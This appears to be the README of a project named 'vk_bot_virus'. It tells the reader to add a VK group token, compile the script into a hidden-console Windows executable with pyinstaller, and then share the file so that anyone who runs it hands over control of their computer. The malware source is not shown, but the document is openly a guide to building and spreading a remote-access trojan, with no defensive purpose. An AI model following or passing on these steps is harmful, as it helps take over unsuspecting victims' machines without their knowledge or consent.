#! Before convert from py to exe put your group token from vk.com in 20 string #!

After downloading the file from git you need to put your vk group token in python file and convert file from .py to .exe
	To convert this file you need to install pyinstaller :
		cmd> pip3 install pyinstaller
		cmd> cd "your directory with vk_bot_virus"
 		cmd> pyinstaller -F -w vk_bot_virus.py

You will get several folders but vk_bot_virus with exe file permission only in "dist" folder
open it  and one more folder after it you will see mant files among which will be vk_bot_virus.exe   



Now you can share it.  And if someone runs this file then you can control his computer.
